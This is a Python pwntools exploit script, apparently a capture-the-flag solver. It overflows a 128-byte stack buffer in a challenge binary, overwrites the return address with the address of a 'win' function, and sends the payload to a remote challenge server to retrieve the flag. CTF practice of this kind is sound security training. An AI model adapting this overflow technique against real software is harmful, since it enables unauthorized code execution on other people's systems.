#!/usr/bin/env python3
from pwn import *

# This script is designed to exploit the buffer overflow vulnerability
# in the provided C code, now targeting a remote server.

# --- Configuration ---
# Set the context for the binary architecture (e.g., 'amd64' for 64-bit, 'i386' for 32-bit)
# This is important for packing addresses correctly.
context.arch = 'amd64'
context.os = 'linux'

# --- Remote Target ---
HOST = 'chal.wwctf.com'
PORT = 4001

# --- Exploit Steps ---

def run_exploit(binary_path='./a.out', use_remote=False):
    """
    Runs the exploit against the vulnerable binary, either locally or remotely.

    Args:
        binary_path (str): The path to the compiled vulnerable C program.
                           This is ALWAYS needed to find function addresses.
        use_remote (bool): If True, connect to the remote server. Otherwise, run locally.
    """
    log.info("Starting exploit...")

    # The local binary is still required to get the address of the 'win' function.
    # Make sure you have the correct binary provided by the challenge.
    try:
        elf = ELF(binary_path)
    except FileNotFoundError:
        log.error(f"Binary '{binary_path}' not found. Please download the challenge binary.")
        log.info("The exploit needs the binary file locally to calculate the 'win' function address.")
        return

    # 1. Find the address of the 'win' function.
    #    pwntools makes this easy by parsing the ELF symbol table.
    win_address = elf.symbols['win']
    log.success(f"Found local 'win' function address at: {hex(win_address)}")

    # 2. Determine the offset to overwrite the return address.
    #    The buffer is 128 bytes. We need to fill the buffer and then
    #    overwrite the saved base pointer (RBP) before we reach the return address.
    #    - Buffer: 128 bytes
    #    - Saved RBP: 8 bytes (on a 64-bit system)
    #    Total offset = 128 + 8 = 136
    offset = 136
    log.info(f"Calculated offset to return address: {offset} bytes")

    # 3. Craft the payload.
    #    The payload consists of junk bytes to fill the buffer, followed by
    #    the address of our target function ('win'), packed in little-endian format.
    payload = b'A' * offset             # Fill the buffer and overwrite RBP
    payload += p64(win_address)        # Overwrite the return address with win()'s address

    log.info("Payload constructed:")
    print(hexdump(payload))

    # 4. Start the process (local or remote) and send the payload.
    if use_remote:
        log.info(f"Connecting to remote server: {HOST}:{PORT}")
        p = remote(HOST, PORT)
    else:
        log.info(f"Starting local process: {binary_path}")
        p = process(binary_path)


    # Wait for the program to print its initial prompt "> "
    p.recvuntil(b'> ')

    # Send the malicious payload
    log.info("Sending payload...")
    p.sendline(payload)

    # 5. Receive the output.
    #    If the exploit is successful, the 'win' function will be called,
    #    and it will print the contents of the flag.
    try:
        # Use recvall to get all the output until the connection closes.
        output = p.recvall(timeout=3)
        log.success("Exploit successful! Received output:")
        print(output.decode(errors='ignore'))
    except Exception as e:
        log.error(f"Failed to receive output or an error occurred: {e}")
        # For remote targets, interactive mode might not be useful if the process exits.
        # But it can be helpful for debugging if the connection stays open.
        p.interactive()

    p.close()


if __name__ == "__main__":
    # To run this script:
    # 1. Make sure you have the challenge binary (e.g., 'a.out') in the same directory.
    #    The script needs it to find the address of the 'win' function.
    # 2. Run this Python script: `python3 solver.py`
    
    # You can pass the path to your binary as a command-line argument
    import sys
    binary = sys.argv[1] if len(sys.argv) > 1 else './a.out'
    
    # Set use_remote to True to attack the server
    run_exploit(binary_path=binary, use_remote=True)
